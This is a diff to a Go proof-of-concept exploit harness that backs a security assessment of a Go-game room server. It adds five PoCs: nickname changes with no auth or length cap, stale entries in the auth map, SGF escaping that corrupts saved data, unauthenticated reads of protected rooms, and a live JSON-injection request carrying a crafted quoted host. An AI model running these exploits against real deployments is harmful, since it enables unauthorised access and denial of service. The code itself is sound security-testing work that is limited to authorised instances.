@@ -692,6 +692,136 @@ func pocM7() {
 }
 
 // =========================================================================
+// MEDIUM (extended) — see SECURITY_ASSESSMENT.md §5/§6
+// =========================================================================
+
+// M-3: update_nickname has no `authorized`, no `outsideBuffer`, and no length cap.
+func pocM3nick() {
+	banner("nick", "update_nickname: no auth, no length cap (mutates a password room)")
+	r := room.NewRoom("nick")
+	r.SetPassword(core.Hash("the-secret")) // protected room
+	ec := evpkg.NewMockEventChannel()
+	id := r.RegisterConnection(ec) // attacker never sent checkpassword
+
+	huge := strings.Repeat("A", 200000) // 200 KB nickname, no cap
+	e := evpkg.NewEvent("update_nickname", huge)
+	e.SetUser(id)
+	r.HandleAny(e)
+	got := r.Nicks()[id]
+	fmt.Printf("set a %d-byte nickname on a PASSWORD room, unauthenticated -> stored length %d\n", len(huge), len(got))
+	if len(got) == len(huge) {
+		fmt.Println(">> CONFIRMED: no auth gate and no length cap; the full nick map is re-broadcast to all")
+		fmt.Println(">> connections on every change (N^2 with N connections).")
+	}
+}
+
+// M-4: the per-room auth map is never pruned — deregistered connections stay
+// authorized, so reconnect churn grows it without bound.
+func pocM4authleak() {
+	banner("authleak", "Per-room auth map never pruned (deregistered conns stay authorized)")
+	r := room.NewRoom("authleak")
+	ids := []string{}
+	for i := 0; i < 5; i++ {
+		ids = append(ids, r.RegisterConnection(evpkg.NewMockEventChannel()))
+	}
+	r.SetAuthAll() // authorize all current connections (as a password-set does)
+	for _, id := range ids {
+		r.DeregisterConnection(id) // client disconnects
+	}
+	leaked := 0
+	for _, id := range ids {
+		if r.GetAuth(id) {
+			leaked++
+		}
+	}
+	fmt.Printf("registered+authed 5 conns, then disconnected all -> still authorized: %d/5\n", leaked)
+	if leaked == 5 {
+		fmt.Println(">> CONFIRMED: DeregisterConnection prunes only conns/nicks, never auth (or message.notified).")
+		fmt.Println(">> Each reconnect uses a fresh UUID, so the map grows monotonically for the room's ~24h life.")
+	}
+}
+
+// M-5: SGF label escaping is not round-trip safe (only ']' is escaped, not '\'),
+// so a persisted label corrupts on reload — save/reparse is not idempotent.
+func pocM5sgfesc() {
+	banner("sgfesc", "SGF label escaping not round-trip safe -> persisted corruption")
+	s := state.NewState(19)
+	_, _ = state.NewAddLabelCommand(coord.NewCoord(3, 3), "pwn\\").Execute(s) // label ends in a backslash
+	dec1, _ := base64.StdEncoding.DecodeString(s.Save().SGF)
+	fmt.Printf("persisted SGF: %s\n", string(dec1))
+
+	s2, err := state.FromSGF(string(dec1)) // reload (as Hub.Load does on restart)
+	if err != nil {
+		fmt.Printf("reload error: %v (board dropped)\n", err)
+		return
+	}
+	// The SGF *bytes* are stable, but the fields are corrupted: the trailing '\'
+	// makes the LB field's closing ']' be read as an escaped literal, so LB
+	// swallows the following PB field on reparse.
+	lbBefore := s.Root().GetField("LB")
+	lbAfter := s2.Root().GetField("LB")
+	pbBefore := s.Root().GetField("PB")
+	pbAfter := s2.Root().GetField("PB")
+	fmt.Printf("LB field: before=%q  after reload=%q\n", lbBefore, lbAfter)
+	fmt.Printf("PB field: before=%q  after reload=%q\n", pbBefore, pbAfter)
+	if fmt.Sprint(lbBefore) != fmt.Sprint(lbAfter) || fmt.Sprint(pbBefore) != fmt.Sprint(pbAfter) {
+		fmt.Println(">> CONFIRMED: on reload the LB label swallowed the PB field (escaping isn't round-trip safe).")
+		fmt.Println(">> A crafted label silently corrupts/merges persisted fields on every restart.")
+	} else {
+		fmt.Println("round-trips cleanly (unexpected)")
+	}
+}
+
+// ID-1: the password gates writes only. Any connection — with no auth — receives
+// the full board state immediately on connect (and every subsequent move).
+func pocID1readpriv() {
+	banner("id1", "Password gates writes only: an unauthenticated socket reads a protected room's full state")
+	r := room.NewRoom("id1")
+	r.SetPassword(core.Hash("the-secret")) // "protected"
+	// seed some state the owner would consider private
+	seed := evpkg.NewEvent("graft", "d4")
+	seed.SetUser("owner")
+	r.SetAuth("owner", true)
+	r.HandleAny(seed)
+
+	spy := evpkg.NewMockEventChannel() // attacker: never authenticated
+	_ = r.RegisterConnection(spy)      // exactly what Hub.Handle does for any WS
+	got := ""
+	if len(spy.SavedEvents) > 0 {
+		got = spy.SavedEvents[0].Type()
+	}
+	fmt.Printf("unauthenticated connect to a PASSWORD room -> first event received: %q\n", got)
+	if got == "frame" {
+		fmt.Println(">> CONFIRMED: RegisterConnection pushes GenerateFullFrame(Full) with no auth check;")
+		fmt.Println(">> the attacker reads the full board + every live move + occupant UUIDs (which feed AZ-1).")
+	}
+}
+
+// ID-3 / ID-4: the /api/v1 handler builds JSON with fmt.Sprintf and interpolates
+// the raw fetch error (which reflects the requested host) -> JSON injection + a
+// host-reflection / allowlist-enumeration oracle. url.Parse keeps a '"' in the
+// host, so the injected quote breaks out of the JSON string. No network needed.
+func pocID3jsoninj() {
+	banner("id3", "/api/v1 hand-rolled JSON interpolates a raw error -> JSON injection + host reflection")
+	requireTarget()
+	// an unapproved URL whose host contains a double quote
+	body := `{"event":"request_sgf","value":"https://evil-` + `\"injected\"` + `.example/x"}`
+	req, _ := http.NewRequest("POST", "http://"+target+"/api/v1/room/id3", strings.NewReader(body))
+	req.Header.Set("Content-Type", "application/json")
+	resp, err := (&http.Client{Timeout: 5 * time.Second}).Do(req)
+	if err != nil {
+		fmt.Println("request error:", err)
+		return
+	}
+	b, _ := io.ReadAll(resp.Body)
+	_ = resp.Body.Close()
+	raw := strings.TrimSpace(string(b))
+	fmt.Printf("request_sgf with a quoted host -> raw response body:\n  %s\n", raw)
+	fmt.Println(">> The response reflects the attacker-supplied host verbatim (allowlist-enumeration oracle, ID-4)")
+	fmt.Println(">> and the un-escaped quote is interpolated into the hand-rolled error-string template -> broken/injected JSON (ID-3).")
+}
+
+// =========================================================================
 // EXTENDED REVIEW — concurrency / crypto (see SECURITY_ASSESSMENT.md §11)
 // =========================================================================
 
@@ -1120,6 +1250,11 @@ var pocs = []struct {
 	{"dr1", "[ext] Concurrent map race on r.nicks via /api/v1 — fatal crash (CONFIRMED)", pocDR1},
 	{"dl2", "[ext] Slow-reader freezes whole room (lock held during ws write) (CONFIRMED)", pocDL2},
 	{"cs2", "[ext] >72-byte password silently disables protection (CONFIRMED)", pocCS2},
+	{"nick", "[Medium M-3] update_nickname no auth / no length cap (CONFIRMED)", pocM3nick},
+	{"authleak", "[Medium M-4] per-room auth map never pruned (CONFIRMED)", pocM4authleak},
+	{"sgfesc", "[Medium M-5] SGF label escaping not round-trip safe (CONFIRMED)", pocM5sgfesc},
+	{"id1", "[Medium ID-1] password room fully readable by unauth socket (CONFIRMED)", pocID1readpriv},
+	{"id3", "[Medium ID-3/ID-4] /api/v1 JSON injection + host reflection (CONFIRMED)", pocID3jsoninj},
 	{"graft", "[High H-6] graft bypasses authorized middleware on a password room (CONFIRMED)", pocH6graft},
 	{"grow", "[High H-7] Unbounded tree growth + quadratic full-frame rebroadcast (CONFIRMED)", pocH7grow},
 	{"gl1", "[High] Room.Close never ends plugins -> leak (root of H-8) (CONFIRMED)", pocGL1},
@@ -1136,8 +1271,8 @@ func usage() {
 	for _, p := range pocs {
 		fmt.Printf("  %-4s %s\n", p.id, p.title)
 	}
-	fmt.Println("\nlocal-only (no -target needed): c2 c5 c6 h6 h7 a1 b1 m4 m7 dl2 cs2 graft grow gl1 dl1 az1 az2 cs1  (h6 verifies a mitigation)")
-	fmt.Println("need -target (live disposable instance): c1 c3 c4 c7 h1 h2 h3 h4 h5 m2 m3 m5 dr1")
+	fmt.Println("\nlocal-only (no -target needed): c2 c5 c6 h6 h7 a1 b1 m4 m7 dl2 cs2 graft grow gl1 dl1 az1 az2 cs1 nick authleak sgfesc id1  (h6 verifies a mitigation)")
+	fmt.Println("need -target (live disposable instance): c1 c3 c4 c7 h1 h2 h3 h4 h5 m2 m3 m5 dr1 id3")
 	fmt.Println("b1 also runs e2e when -target is given (uploads the poison, then you join to brick it)")
 	fmt.Println("\nWARNING: several PoCs crash or exhaust the target. Authorised local testing only.")
 }
